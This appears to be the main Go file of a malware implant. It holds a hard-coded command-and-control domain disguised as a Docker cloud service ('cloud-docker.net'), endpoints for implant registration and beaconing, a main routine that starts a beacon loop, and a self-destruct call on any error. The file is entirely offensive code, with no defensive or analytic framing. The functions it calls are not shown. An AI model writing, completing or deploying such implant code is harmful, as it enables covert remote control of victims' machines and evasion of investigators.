package main

import (
	"math/rand"
	"time"
)

const (
	C2Domain              = "cloud-docker.net:80"
	C2RegisterEndpoint    = "/implant/register"
	C2HTTPSBeaconEndpoint = "/implant/beacon"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {
	implant, err := NewImplant()
	if err != nil {
		SelfDestruct()
	}
	err = implant.BeaconLoop()
	if err != nil {
		SelfDestruct()
	}
}
